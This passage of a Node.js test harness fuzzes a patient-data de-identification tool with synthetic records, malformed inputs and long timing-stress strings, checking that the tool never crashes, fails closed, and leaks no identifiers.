#!/usr/bin/env node
/* Robustness harness for Infusion De-ID: the core pipeline plus the page's own workbook and export code paths.
 *
 *   node test/robust.js               all sections
 *   node test/robust.js --quick       fewer seeds, 5k-char ReDoS strings only, 5,000-row scale test
 *   node test/robust.js --only 2,4    selected sections
 *   node test/robust.js --json        machine-readable results on the last line
 *   node test/robust.js --verbose     print timing tables for the ReDoS families
 *
 * Sections
 *   1 never throws       processTable / parseTextDocument / selfCheck on random, degenerate and malformed input;
 *                        an internal error must be reported in result.errors AND turn into a self-check hit (fail closed)
 *   2 ReDoS / time       per-cell time bounds on adversarial strings (250 ms for 5k chars, 2 s for 100k chars); every
 *                        family runs in its own child process with a hard timeout, so a hang is killed and the step it
 *                        hung in is named; per-detector times (ruleSpans, lexiconSpans, censusSpans) are measured on the
 *                        same chunks detectText feeds them
 *   3 census guarantee   no MRN, account, phone, "First Last" or "Last, First" of a census patient (or of a patient-list
 *                        patient) survives into the protected output in any case or spacing; leaks are classified as
 *                        flagged by the self-check (download blocked) or not flagged (downloadable)
 *   4 workbook path      SheetJS workbooks with title rows, hidden columns, comments, hyperlinks, merges, formulas and a
 *                        second sheet of PHI, read with the page's own functions (sliced out of src/app.js), exported with
 *                        the page's aoaOut, and the written .xlsx zip scanned entry by entry
 *   5 scale              20,000 rows (core path; the page protects inputs over 1,200 rows in parts)
 *   6 formula injection  no exported cell starts with = + - @ tab CR (or the full-width forms) after surrogation
 *
 * Each section runs in its own child process with a hard timeout; a section that hangs or crashes is reported with the
 * last step it started. Exit code 1 when any check FAILs. Read-only: this file writes nothing to disk.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const os = require('os');
const { spawnSync, spawn } = require('child_process');

const ROOT = path.resolve(__dirname, '..');
const SRC = (f) => path.join(ROOT, 'src', f);
const argv = process.argv.slice(2);
const QUICK = argv.includes('--quick');
const VERBOSE = argv.includes('--verbose');
const JSON_OUT = argv.includes('--json');

const now = () => Number(process.hrtime.bigint()) / 1e6;
const short = (s, n) => { s = String(s); n = n || 160; return s.length > n ? `${s.slice(0, n)}\u2026(${s.length} chars)` : s; };
const jstr = (s, n) => JSON.stringify(short(s, n));
const rep = (unit, n) => unit.repeat(Math.ceil(n / unit.length)).slice(0, n);
const errMsg = (e) => String((e && e.stack ? e.stack.split('\n').slice(0, 3).join(' / ') : e && e.message) || e);

// ---------------------------------------------------------------- child protocol
function emitLine(tag, obj) { fs.writeSync(1, `${tag} ${JSON.stringify(obj)}\n`); }
const progress = (label) => emitLine('@@P', label);
const emit = (rec) => emitLine('@@R', rec);
function emitCheck(sec, id, name, problems, extra) {
  // problems: [{ sev, label, msg, repro, observed, expected }]
  const sevRank = { blocker: 3, major: 2, minor: 1 };
  if (!problems.length) { emit(Object.assign({ sec, id, name, status: 'PASS' }, extra || {})); return; }
  const worst = problems.reduce((w, p) => (sevRank[p.sev] > sevRank[w] ? p.sev : w), 'minor');
  const first = problems.find((p) => p.sev === worst) || problems[0];
  emit(Object.assign({
    sec, id, name, status: 'FAIL', severity: worst, count: problems.length,
    observed: first.observed || first.msg, expected: first.expected || '', repro: first.repro || '',
    examples: problems.slice(0, 6).map((p) => `[${p.sev}] ${p.label}: ${short(p.msg, 300)}`),
  }, extra || {}));
}

// ---------------------------------------------------------------- shared helpers
function loadCore() { return require(SRC('core.js')); }
function isPrimitiveCell(v) { return v == null || typeof v === 'string' || typeof v === 'number' || typeof v === 'boolean' || (v instanceof Date); }
function runPipeline(D, table, cfg, kind) {
  const o = { threw: null, checkThrew: null, res: null, chk: null, ms: 0, shapeBad: null, errors: [], blocked: false, errorGated: true, badCells: 0 };
  const nRows = table && Array.isArray(table.rows) ? table.rows.length : 0;
  const t0 = now();
  try { o.res = D.processTable(table, cfg); } catch (e) { o.threw = e; o.ms = now() - t0; return o; }
  o.ms = now() - t0;
  const r = o.res;
  if (!r || !Array.isArray(r.rows) || !Array.isArray(r.headers) || !Array.isArray(r.details) || !r.census || !(r.census.patients instanceof Map) || !r.stats || !r.cfg) o.shapeBad = 'result incomplete (the page rejects it: checkResultShape)';
  else if (r.rows.length !== nRows || r.details.length !== nRows) o.shapeBad = `result has ${r.rows.length} rows / ${r.details.length} details, input has ${nRows}`;
  o.errors = (r && Array.isArray(r.errors)) ? r.errors : [];
  if (r && Array.isArray(r.rows)) r.rows.forEach((row) => (Array.isArray(row) ? row : [row]).forEach((v) => { if (!isPrimitiveCell(v)) o.badCells++; }));
  try { o.chk = D.selfCheck(r, { kind: kind || 'table' }); } catch (e) { o.checkThrew = e; }
  if (o.chk) o.blocked = (o.chk.hits || []).length > 0 || (o.chk.unnamed || []).length > 0;
  o.errorGated = !o.errors.length || !!(o.chk && (o.chk.hits || []).some((h) => h.kind === 'error'));
  return o;
}
// classify a pipeline run into problems
function pipelineProblems(o, label, repro, opts) {
  const p = [];
  const hostile = opts && opts.hostile;
  if (o.threw) p.push({ sev: hostile ? 'minor' : 'blocker', label, msg: `processTable threw: ${errMsg(o.threw)}`, repro, observed: `exception escaped processTable: ${errMsg(o.threw)}`, expected: 'processTable never throws; a failure comes back as result.errors with every cell blanked' });
  if (o.checkThrew) p.push({ sev: 'blocker', label, msg: `selfCheck threw: ${errMsg(o.checkThrew)}`, repro, observed: `exception escaped selfCheck: ${errMsg(o.checkThrew)}`, expected: 'selfCheck never throws' });
  // failClosedOk: an input that cannot be read at all (a revoked Proxy) has no content to protect, so failing the whole run
  // closed (result.errors, every cell blank, a self-check error hit) is the expected outcome, not a defect. Check 1.7 uses this
  // same object to force the error path and requires exactly that, so 1.3b cannot also demand "no internal error" for it.
  const failedClosed = !o.threw && o.errors.length && o.errorGated && o.res && Array.isArray(o.res.rows) && o.res.rows.every((r) => (Array.isArray(r) ? r : [r]).every((v) => v === '' || v == null));
  if (!o.threw && o.errors.length && opts && opts.failClosedOk && !failedClosed) p.push({ sev: 'major', label, msg: 'unreadable input reported an error but the result is not fully blanked or not gated', repro, observed: `result.errors = ${short(JSON.stringify(o.errors.slice(0, 2)), 300)}`, expected: 'fail closed: every cell blank and a self-check error hit' });
  if (!o.threw && o.errors.length && !(opts && opts.failClosedOk)) {
    p.push({ sev: hostile ? 'minor' : (opts && opts.errSev) || 'major', label, msg: `internal error caught (fail-closed, input unusable): ${short(o.errors[0].message, 200)} [row ${o.errors[0].row}, col ${o.errors[0].col}]`, repro, observed: `result.errors = ${short(JSON.stringify(o.errors.slice(0, 2)), 300)}`, expected: 'no internal error on this input' });
    if (!o.errorGated) p.push({ sev: 'blocker', label, msg: 'result.errors is non-empty but selfCheck reported no error hit (download would not be blocked)', repro, observed: 'no kind:error hit', expected: 'every processing error becomes a self-check hit' });
  }
  if (!o.threw && o.shapeBad) p.push({ sev: 'major', label, msg: o.shapeBad, repro, observed: o.shapeBad, expected: 'one output row and one detail per input row' });
  if (!o.threw && o.badCells) p.push({ sev: 'minor', label, msg: `${o.badCells} output cell(s) are not string/number/boolean/Date/null`, repro, observed: 'non-primitive cell in result.rows', expected: 'every output cell is a plain value' });
  return p;
}
function makeRng(D, seed) {
  const r = D.mulberry32(seed);
  return { next: r, int: (a, b) => a + Math.floor(r() * (b - a + 1)), pick: (arr) => arr[Math.floor(r() * arr.length)], chance: (p) => r() < p };
}
function randomCodeUnits(rng, n, lo, hi) { let s = ''; for (let i = 0; i < n; i++) s += String.fromCharCode(rng.int(lo, hi)); return s; }
const WORDS = ['pt', 'tolerated', 'infusion', 'well', 'called', 're', 'labs', 'Keytruda', 'premed', 'Benadryl', 'hold', 'if', 'ANC', 'low', 'son', 'will', 'drive', 'Dr.', 'Smith', 'MRN', '00412349', '716-555-0144', '11/7/26', 'Buffalo,', 'NY', 'Gatsby,', 'Jay', 'daughter', 'Maria', 'chair', '4', 'C1D1', 'next', 'cycle', 'Nov', '20th'];
function randomWords(rng, n) { let s = ''; while (s.length < n) s += rng.pick(WORDS) + rng.pick([' ', ' ', ' ', ', ', '. ', '\n']); return s.slice(0, n); }

function noiseStrings(rng) {
  return {
    emoji: 'Pt \uD83D\uDE00 Gatsby\uD83D\uDC4D\uD83C\uDFFD Jay \uD83D\uDC68\u200D\uD83D\uDC69\u200D\uD83D\uDC67\u200D\uD83D\uDC66 called \uD83C\uDDFA\uD83C\uDDF8 re: labs \uD83D\uDC89 \uD83D\uDE00\uFE0F',
    rtl: '\u0627\u0644\u0645\u0631\u064A\u0636 \u0645\u062D\u0645\u062F \u0639\u0628\u062F \u0627\u0644\u0644\u0647 \u0627\u062A\u0635\u0644 716-555-0123 \u05E9\u05DC\u05D5\u05DD \u05D3\u05D5\u05D3 \u05DB\u05D4\u05DF \u202Eyaj ,ybstaG\u202C MRN \u200F00123456\u200E',
    combining: 'Jose\u0301 Garci\u0301a; Ame\u0301lie; Z\u0337\u0322\u034Ea\u0338l\u0335g\u0336o\u0337 \u0301\u0301\u0301 n\u0303',
    nbspzw: 'Gatsby,\u00A0Jay\u200B MRN\u00A0001\u200B23456 \uFEFF\u2060called\u202F716\u00A0555\u20090123\u00AD',
    crlf: 'line one\r\nGatsby, Jay\r\nMRN 00123456\r\n\r\n',
    cr: 'line one\rGatsby, Jay\rMRN 00123456\rDOB 1/2/1950\r',
    control: '\u0000\u0001\u0007\b\v\f\u001B[31mred\u001B[0m\u007F\u0085',
    linesep: 'Gatsby, Jay\u2028called\u2029back',
    fullwidth: '\uFF27\uFF21\uFF34\uFF33\uFF22\uFF39\uFF0C\uFF2A\uFF21\uFF39\u3000\uFF2D\uFF32\uFF2E\uFF10\uFF10\uFF11\uFF12\uFF13\uFF14\uFF15\uFF16',
    mathbold: '\uD835\uDC06\uD835\uDC1A\uD835\uDC2D\uD835\uDC2C\uD835\uDC1B\uD835\uDC32, \uD835\uDC09\uD835\uDC1A\uD835\uDC32',
    loneSurrogates: 'Gat\uD800sby \uDC00Jay \uDBFF',
    binaryUtf16: randomCodeUnits(rng, 400, 0, 0xFFFF),
    binaryBytes: randomCodeUnits(rng, 400, 0, 255),
    whitespace: ' \t \u00A0 \u3000 ',
    long1k: randomWords(rng, 1000),
  };
}
const REALISTIC_VALUES = () => [0, -0, NaN, Infinity, -Infinity, 1e308, 5e-324, 123456789, 7165550123, 0.5, -42, true, false, new Date(2026, 10, 9), new Date(1900, 0, 1), new Date(NaN), null, undefined, '', ' '];

// =================================================================== section 1: never throws
function section1() {
  const D = loadCore();
  const S = require(SRC('synth.js'));
  const rng = makeRng(D, 9001);
  const NOISE = noiseStrings(rng);
  const noiseList = Object.values(NOISE);
  const checks = {};
  const add = (id, problems) => { (checks[id] = checks[id] || []).push(...problems); };
  const run = (id, label, table, cfg, kind, opts) => {
    progress(`1 ${id} ${label}`);
    const o = runPipeline(D, table, cfg, kind);
    add(id, pipelineProblems(o, label, (opts && opts.repro) || '', opts));
    return o;
  };

  // 1.1 synthetic tables with noise, one shared session registry (like many files in one page session)
  const seeds = QUICK ? 10 : 40;
  const sessionReg = D.createRegistry();
  for (let seed = 1; seed <= seeds; seed++) {
    const s = S.make({ n: 20 + (seed % 5) * 10, seed });
    const rows = s.rows.map((r) => r.slice());
    const headers = s.headers.slice();
    const vals = REALISTIC_VALUES();
    rows.forEach((row, ri) => {
      row.forEach((v, ci) => {
        if (rng.chance(0.12)) row[ci] = rng.chance(0.5) ? rng.pick(noiseList) : rng.pick(vals);
        else if (typeof v === 'string' && rng.chance(0.15)) { const at = rng.int(0, v.length); row[ci] = v.slice(0, at) + rng.pick(['\u200B', '\u00A0', '\r', '\r\n', '\uD83D\uDE00', '\u0301', '\u202E', '\uD800', '\t']) + v.slice(at); }
      });
      if (rng.chance(0.05)) row.length = rng.int(0, row.length);
      if (rng.chance(0.05)) row.push(rng.pick(noiseList), rng.pick(vals));
    });
    if (rng.chance(0.3)) headers[rng.int(0, headers.length - 1)] = rng.pick([null, '', 'Comments', undefined, 42, NOISE.emoji]);
    run('1.1', `synth seed ${seed}`, { headers, rows }, { seed, registry: sessionReg }, 'table', { repro: `S.make({n:${20 + (seed % 5) * 10}, seed:${seed}}) + seeded noise (see section1 in test/robust.js); one shared registry` });
  }
  emitCheck(1, '1.1', `processTable/selfCheck never throw on ${seeds} noisy synthetic tables (shared session registry)`, checks['1.1'] || []);

  // 1.2 degenerate tables
  const syn = S.make({ n: 6, seed: 5 });
  const degenerate = {
    'empty table': { headers: [], rows: [] },
    'header-only': { headers: syn.headers, rows: [] },
    'header-only one column': { headers: ['Comments'], rows: [] },
    'all-null rows': { headers: syn.headers, rows: Array.from({ length: 30 }, () => syn.headers.map(() => null)) },
    'all-undefined rows': { headers: syn.headers, rows: Array.from({ length: 5 }, () => syn.headers.map(() => undefined)) },
    'sparse rows (holes)': { headers: syn.headers, rows: Array.from({ length: 5 }, () => new Array(syn.headers.length)) },
    'empty-array rows': { headers: syn.headers, rows: [[], [], []] },
    '1-column comments': { headers: ['Comments'], rows: syn.rows.map((r) => [r[14]]) },
    '1-column names': { headers: ['Patient Name'], rows: syn.rows.map((r) => [r[2]]) },
    '1-column MRN numbers': { headers: ['MRN'], rows: syn.rows.map((r) => [Number(r[3])]) },
    '1-column no header': { headers: [''], rows: syn.rows.map((r) => [r[14]]) },
    'no headers, data present': { headers: [], rows: syn.rows },
    'rows longer than headers': { headers: ['Patient Name', 'MRN'], rows: syn.rows },
    'headers longer than rows': { headers: syn.headers.concat(['Extra 1', 'Extra 2']), rows: syn.rows.map((r) => r.slice(0, 5)) },
    'duplicate headers': { headers: ['Comments', 'Comments', 'Comments'], rows: syn.rows.map((r) => [r[14], r[2], r[3]]) },
    'non-string headers': { headers: [null, 42, new Date(2026, 0, 1), true, { a: 1 }, ['x'], undefined, NaN], rows: syn.rows.map((r) => r.slice(0, 8)) },
    'wide table 3000 columns': { headers: Array.from({ length: 3000 }, (_, i) => `C${i}`), rows: [Array.from({ length: 3000 }, (_, i) => (i % 7 === 0 ? 'Gatsby, Jay called' : i))] },
    'rows containing null/scalars': { headers: syn.headers, rows: [null, undefined, 'Gatsby, Jay MRN 00123456', 42, syn.rows[0]] },
    'table null': null, 'table undefined': undefined, 'table {}': {}, 'table string': 'Gatsby, Jay', 'table number': 42,
    'headers string, rows string': { headers: 'abc', rows: 'def' },
    'headers null, rows array': { headers: null, rows: syn.rows },
    'rows array-like object': { headers: syn.headers, rows: { length: 2, 0: syn.rows[0], 1: syn.rows[1] } },
  };
  for (const [label, table] of Object.entries(degenerate)) run('1.2', label, table, { seed: 1 }, 'table', { repro: `processTable(<${label}>, {seed:1}) \u2014 see section1 degenerate table "${label}"` });
  emitCheck(1, '1.2', 'degenerate tables (empty, header-only, all-null, 1-column, ragged, malformed table objects)', checks['1.2'] || []);

  // 1.3 typed values in every column; hostile objects separately (unreachable from a file: SheetJS yields plain values)
  const typed = syn.rows.map((r) => r.map(() => rng.pick(REALISTIC_VALUES())));
  run('1.3', 'numbers/Dates/booleans/null in every column (auto roles)', { headers: syn.headers, rows: typed }, { seed: 1 }, 'table', { repro: 'synth headers, every cell a random value from [0,-0,NaN,Infinity,1e308,123456789,true,false,new Date(),new Date(NaN),null,undefined,"", " "]' });
  const allRoles = ['date', 'patient_name', 'mrn', 'dob', 'age', 'account', 'phone', 'provider', 'zip', 'text', 'keep', 'drop'];
  const roleHeaders = ['Appt Date', 'Patient Name', 'MRN', 'DOB', 'Age', 'Acct #', 'Phone', 'Attending', 'ZIP', 'Comments', 'Chair', 'Address'];
  const baseRow = () => [new Date(2026, 10, 9), 'Gatsby, Jay', '00418327', '1/2/1950', 76, '1234567890', '716-555-0199', 'Wolfsheim, Meyer MD', '14217', 'Gatsby called re: labs; son Nick at 716-555-0123', '4', '12 Egg Rd'];
  REALISTIC_VALUES().forEach((v, k) => {
    const rows = [baseRow(), baseRow().map(() => v), baseRow()];
    run('1.3', `value #${k} (${typeof v === 'number' ? String(v) : v instanceof Date ? 'Date ' + String(v) : JSON.stringify(v)}) in every role`, { headers: roleHeaders, rows }, { seed: 1, columns: allRoles.map((role, i) => ({ header: roleHeaders[i], role })) }, 'table', { repro: `every role column = ${String(v)}` });
  });
  emitCheck(1, '1.3', 'numbers, Dates, booleans, null/undefined in every column role', checks['1.3'] || []);

  const revoked = Proxy.revocable({}, {}); revoked.revoke();
  const hostile = {
    'object {}': {}, 'array cell': [['nested', 1], 'Gatsby'], 'object with toString': { toString() { return 'Gatsby, Jay 716-555-0199'; } },
    'toString throws': { toString() { throw new Error('boom'); } }, 'Object.create(null)': Object.create(null), 'Symbol': Symbol('x'),
    'BigInt': BigInt('123456789012'), 'function': function Gatsby() {}, 'Map': new Map([['a', 1]]), 'Uint8Array': new Uint8Array([71, 97]),
    'valueOf/toString return objects': { toString() { return {}; }, valueOf() { return {}; } }, 'revoked Proxy cell': revoked.proxy,
  };
  for (const [label, v] of Object.entries(hostile)) {
    const rows = [baseRow(), baseRow().map(() => v), baseRow()];
    run('1.3b', `${label} in every role`, { headers: roleHeaders, rows }, { seed: 1, columns: allRoles.map((role, i) => ({ header: roleHeaders[i], role })) }, 'table', { hostile: true, failClosedOk: v === revoked.proxy, repro: `processTable({headers:[12 role headers], rows:[ok, <${label}> in every cell, ok]}, {columns: explicit roles})` });
  }
  { const rp = Proxy.revocable([], {}); rp.revoke(); run('1.3b', 'revoked Proxy as a whole row', { headers: roleHeaders, rows: [baseRow(), rp.proxy] }, { seed: 1 }, 'table', { hostile: true, failClosedOk: true, repro: 'const p=Proxy.revocable([],{}); p.revoke(); D.processTable({headers:["Comments"], rows:[["x"], p.proxy]}, {})' }); }
  emitCheck(1, '1.3b', 'hostile JS objects as cells/rows (not reachable from a file)', checks['1.3b'] || []);

  // 1.4 extreme strings in every column role, with a per-cell time bound
  const bound = (len) => (len >= 50000 ? 2000 : len >= 4000 ? 250 : 250);
  const EXTREME = Object.assign({}, NOISE, {
    'long words 100k': randomWords(rng, 100000),
    'long digits 100k': randomCodeUnits(rng, 100000, 48, 57),
    'long same char 100k': rep('a', 100000),
    'long names 100k': rep('Gatsby, Jay; ', 100000),
    'long Last,First run 100k': rep('Smith, John ', 100000),
    'long mixed separators 100k': rep('1-2/3.4 (5) ', 100000),
  });
  const slow = [];
  for (const [label, X] of Object.entries(EXTREME)) {
    for (let c = 0; c < roleHeaders.length; c++) {
      const rows = [baseRow(), baseRow(), baseRow()]; rows[1][c] = X;
      const o = run('1.4', `${label} in ${allRoles[c]} column`, { headers: roleHeaders, rows }, { seed: 1, columns: allRoles.map((role, i) => ({ header: roleHeaders[i], role })) }, 'table', { errSev: X.length > 32767 ? 'minor' : 'major', repro: `3-row table with explicit roles; row 2 column "${roleHeaders[c]}" (${allRoles[c]}) = ${label} (${X.length} chars${X.length > 32767 ? ', longer than Excel\'s 32,767-char cell limit: reachable from CSV or a .txt table, not from .xlsx' : ''})` });
      if (!o.threw && X.length >= 4000 && o.ms > bound(X.length) * 2 + 150) slow.push({ sev: 'major', label: `${label} in ${allRoles[c]}`, msg: `processTable took ${o.ms.toFixed(0)} ms (bound ${bound(X.length)} ms for the cell + 150 ms table overhead, x2 slack)`, repro: `3-row table, explicit roles; one ${allRoles[c]} cell = ${label} (${X.length} chars)`, observed: `${o.ms.toFixed(0)} ms`, expected: `< ${bound(X.length) * 2 + 150} ms` });
    }
  }
  emitCheck(1, '1.4', 'extreme strings (100k chars, binary, emoji, RTL, combining, NBSP/zero-width, CRLF, lone CR, control) in every role', checks['1.4'] || []);
  emitCheck(1, '1.4b', 'long cells in non-text roles stay within the time bound', slow);

  // 1.5 parseTextDocument and the text path
  const synTextDocs = [];
  for (let seed = 1; seed <= (QUICK ? 3 : 10); seed++) {
    const s = S.make({ n: 25, seed: 100 + seed });
    const eol = ['\n', '\r\n', '\r'][seed % 3];
    synTextDocs.push([`synth text seed ${100 + seed} eol ${JSON.stringify(eol)}`, s.rows.map((r) => `${r[2]}  MRN ${r[3]}  DOB ${D.cellToString(r[4])}${eol}${r[14]}`).join(eol) + (seed % 2 ? `${eol}===${eol}` : '')]);
  }
  const textInputs = [
    ['empty', ''], ['null', null], ['undefined', undefined], ['zero', 0], ['number', 123456789], ['boolean', true], ['object', {}], ['array', ['Gatsby, Jay', 'MRN 00123456']], ['Date', new Date()],
    ['one char', 'x'], ['lone CRs', '\r\r\r'], ['10k LF', '\n'.repeat(10000)], ['10k CRLF', '\r\n'.repeat(10000)], ['section markers', '===\n'.repeat(2000)], ['=== run', '='.repeat(5000)],
    ['label wrap x1000', 'MRN:\n'.repeat(1000) + '12345678'], ['label wrap with numbers', 'MRN:\n12345678\n'.repeat(1000)], ['phone wrap x1000', '413-555-\n'.repeat(1000) + '0129.'],
    ['phone wrap pairs', '413-555-\n0129.\n'.repeat(1000)], ['name lines x5000', 'Gatsby, Jay\n'.repeat(5000)], ['100k single line words', randomWords(rng, 100000).replace(/\n/g, ' ')],
    ['100k digits one line', randomCodeUnits(rng, 100000, 48, 57)], ['100k dates one line', rep('1/1/2000', 100000)], ['100k 6-10 digit then date', rep('12345678901/1/2000 ', 100000)],
    ['grid/tile text', '11/9/2026 08:00      Teresa           12710386 2/9/1970  R-CHOP\nStewart\n11/11/2026 07:15      Reynolds,       5749277 1/14/1952  Entyvio\nDeepa'],
    ['pipes', rep('| Gatsby, Jay | 00418327 | ', 5000)], ['tabs', rep('Gatsby, Jay\t00418327\t1/2/1950\n', 5000)],
  ].concat(Object.entries(NOISE).map(([k, v]) => [`noise ${k}`, v])).concat(synTextDocs);
  for (const [label, text] of textInputs) {
    progress(`1 1.5 parseTextDocument ${label}`);
    let doc = null; const t0 = now();
    try { doc = D.parseTextDocument(text); } catch (e) { add('1.5', [{ sev: 'blocker', label, msg: `parseTextDocument threw: ${errMsg(e)}`, repro: `D.parseTextDocument(${jstr(text, 80)})`, observed: errMsg(e), expected: 'parseTextDocument never throws' }]); continue; }
    const ms = now() - t0;
    const len = typeof text === 'string' ? text.length : 0;
    if (len >= 4000 && ms > (len >= 50000 ? 2000 : 250) * 2) add('1.5t', [{ sev: 'major', label, msg: `parseTextDocument took ${ms.toFixed(0)} ms on ${len} chars`, repro: `D.parseTextDocument(${jstr(text, 80)})`, observed: `${ms.toFixed(0)} ms`, expected: `< ${(len >= 50000 ? 2000 : 250) * 2} ms` }]);
    if (!doc || !Array.isArray(doc.headers) || !Array.isArray(doc.rows) || !Array.isArray(doc.columns)) { add('1.5', [{ sev: 'major', label, msg: 'parseTextDocument returned no {headers, rows, columns}', repro: `D.parseTextDocument(${jstr(text, 80)})` }]); continue; }
    const reg = D.createRegistry();
    const t1 = now();
    const o = run('1.5', `text path: ${label}`, { headers: doc.headers, rows: doc.rows }, { columns: doc.columns, registry: reg, seed: 7 }, 'text', { repro: `const t=D.parseTextDocument(${jstr(text, 80)}); D.processTable({headers:t.headers, rows:t.rows}, {columns:t.columns, registry:D.createRegistry(), seed:7})` });
    if (!o.threw && len >= 4000 && o.ms > (len >= 50000 ? 2000 : 250) * 4) add('1.5t', [{ sev: 'major', label, msg: `text-path processTable took ${o.ms.toFixed(0)} ms on ${len} chars (${doc.rows.length} rows)`, repro: `parseTextDocument + processTable on ${jstr(text, 60)}`, observed: `${(now() - t1).toFixed(0)} ms`, expected: `< ${(len >= 50000 ? 2000 : 250) * 4} ms` }]);
  }
  emitCheck(1, '1.5', 'parseTextDocument + text path never throw (empty, CR-only, 10k blank lines, wrap-join stress, 100k lines, noise, synthetic notes)', checks['1.5'] || []);
  emitCheck(1, '1.5t', 'text path time on long pasted text (parseTextDocument 2x bound, processTable 4x bound)', checks['1.5t'] || []);

  // 1.6 config fuzz. Reachable from the page: shift range text (optRange), patients/dob/ages/dates selects, allow/deny lists.
  const fz = S.make({ n: 15, seed: 61 });
  const cfgs = [
    ['null', null, 0], ['undefined', undefined, 0], ['string', 'x', 0], ['number', 42, 0], ['array', [], 0],
    ['columns string', { columns: 'abc' }, 0], ['columns garbage', { columns: [null, 5, {}, { role: 'bogus' }] }, 0], ['columns too long', { columns: Array(100).fill('text') }, 0],
    ['mrnPattern invalid', { mrnPattern: '(' }, 1], ['mrnPattern broad', { mrnPattern: '\\d+' }, 1], ['accountPattern invalid', { accountPattern: '[' }, 0], ['extraPatterns garbage', { extraPatterns: ['(', { regex: '[' }, null] }, 0],
    ['seed NaN', { seed: NaN }, 0], ['seed string', { seed: 'abc' }, 0], ['seed huge', { seed: 1e20 }, 0], ['seed negative', { seed: -1 }, 0],
    ['patients code', { surrogate: { patients: 'code' } }, 1], ['providers code', { surrogate: { providers: 'code' } }, 1], ['dob shift', { surrogate: { dob: 'shift' } }, 1], ['dob year', { surrogate: { dob: 'year' } }, 1],
    ['dates removed', { surrogate: { dateShift: false } }, 1], ['ages bands5', { surrogate: { ages: 'bands5' } }, 1], ['ages bands10', { surrogate: { ages: 'bands10' } }, 1],
    ['shiftRange reversed', { surrogate: { shiftRange: [365, 30] } }, 1], ['shiftRange 1-1', { surrogate: { shiftRange: [1, 1] } }, 1], ['shiftRange 30-5', { surrogate: { shiftRange: [30, 5] } }, 1],
    ['shiftRange garbage', { surrogate: { shiftRange: ['a', null] } }, 0], ['surrogate null', { surrogate: null }, 0], ['layers null', { layers: null }, 0],
    ['allowlist garbage', { allowlist: [null, 5, {}] }, 0], ['denylist string', { denylist: 'abc' }, 0], ['allow/deny everything', { allowlist: ['gatsby', 'jay', 'mrn'], denylist: ['the', 'a', 'pt', 'labs'] }, 1],
    ['manual garbage', { manual: { '0:14': { add: [{ start: -5, end: 1e9 }, null], remove: 'x' }, 'x:y': null } }, 0], ['manual huge add', { manual: { '0:14': { add: [{ start: 0, end: 5 }, { start: 3, end: 9, type: 'BOGUS' }] } } }, 0],
    ['registry bogus object', { registry: {} }, 0], ['auditDetail', { auditDetail: true }, 1], ['no audit', { auditColumn: false }, 1], ['deriveAge off', { deriveAge: false }, 1],
  ];
  for (const [label, cfg, reachable] of cfgs) run('1.6', `cfg ${label}`, { headers: fz.headers, rows: fz.rows }, cfg, 'table', { errSev: reachable ? 'major' : 'minor', repro: `D.processTable(S.make({n:15,seed:61}), ${short(JSON.stringify(cfg), 120)})` });
  emitCheck(1, '1.6', 'config fuzz (minor when the option is not reachable from the page)', checks['1.6'] || []);

  // 1.7 fail-closed positive controls: the gates themselves must fire
  const ctl = [];
  { // an internal error becomes an error hit
    const rp = Proxy.revocable({}, {}); rp.revoke();
    const o = runPipeline(D, { headers: ['Comments'], rows: [['Gatsby called'], [rp.proxy]] }, { seed: 1 }, 'table');
    if (o.threw) ctl.push({ sev: 'minor', label: 'forced internal error', msg: `processTable threw instead of failing closed: ${errMsg(o.threw)}`, repro: 'processTable({headers:["Comments"], rows:[["x"],[revokedProxy]]})' });
    else if (!o.errors.length) ctl.push({ sev: 'minor', label: 'forced internal error', msg: 'a revoked Proxy cell did not produce result.errors (could not force the error path)', repro: '' });
    else if (!o.errorGated) ctl.push({ sev: 'blocker', label: 'forced internal error', msg: 'result.errors non-empty, no error hit from selfCheck', repro: 'processTable({headers:["Comments"], rows:[["x"],[revokedProxy]]}) then selfCheck' });
    else if (o.res && o.res.rows.some((r) => r.some((v) => v !== '' && v != null))) ctl.push({ sev: 'major', label: 'forced internal error', msg: 'error result is not fully blanked', repro: '' });
  }
  { // a patient whose name was never read blocks a pasted text
    const t = D.parseTextDocument('MRN 41832795 called re: labs, wants AM slot\nPt tolerated infusion well');
    const o = runPipeline(D, { headers: t.headers, rows: t.rows }, { columns: t.columns, registry: D.createRegistry(), seed: 7 }, 'text');
    if (!o.chk || !((o.chk.unnamed || []).length)) ctl.push({ sev: 'blocker', label: 'unvouched name', msg: 'a text with an MRN and no legible name produced no "unnamed" entry: the page would not block it', repro: 'parseTextDocument("MRN 41832795 called re: labs...") \u2192 processTable \u2192 selfCheck(kind:"text").unnamed', observed: JSON.stringify(o.chk && o.chk.unnamed), expected: 'unnamed.length >= 1' });
  }
  { // every detection layer off: the census check must still see the patients in the output
    const s = S.make({ n: 30, seed: 71 });
    const o = runPipeline(D, { headers: s.headers, rows: s.rows }, { seed: 1, layers: { census: false, rules: false, model: false, propagate: false } }, 'table');
    if (!o.blocked) ctl.push({ sev: 'blocker', label: 'layers off', msg: 'with every detector off the self-check found nothing in output full of PHI', repro: 'processTable(S.make({n:30,seed:71}), {layers:{census:false,rules:false,model:false,propagate:false}}) \u2192 selfCheck', observed: '0 hits', expected: 'hits > 0' });
  }
  { // a zero date offset is reported
    const s = S.make({ n: 10, seed: 72 });
    const o = runPipeline(D, { headers: s.headers, rows: s.rows }, { seed: 1, surrogate: { shiftRange: [0, 0] } }, 'table');
    if (o.chk && !o.chk.hits.some((h) => h.kind === 'offset')) ctl.push({ sev: 'major', label: 'zero date shift', msg: 'shiftRange [0,0] (typed "0-0" in the page) shifted nothing and the self-check did not report it', repro: 'processTable(S.make({n:10,seed:72}), {surrogate:{shiftRange:[0,0]}}) \u2192 selfCheck', observed: 'no kind:offset hit', expected: 'kind:offset hit per patient row' });
  }
  emitCheck(1, '1.7', 'fail-closed positive controls (error \u2192 hit, unnamed patient, layers off, zero shift)', ctl);

  // 1.8 real short surnames that are also credentials or abbreviations (Do/DO, Ma/MA, Pa/PA, Le, Ho, Vo, Ng, An, Wu, Md):
  // a common Vietnamese/Chinese/Korean surname in the census must not break the run when the note uses the abbreviation
  const shortNames = [['Do, Brittany', 'per Kavita DO; f/u with Hamilton, Kavita DO'], ['Ma, Wei', 'MA roomed pt; vitals by MA'], ['Pa, Lee', 'seen by Jones PA; PA-C to call'], ['Le, Thanh', 'Le Fort fx hx; LE edema'],
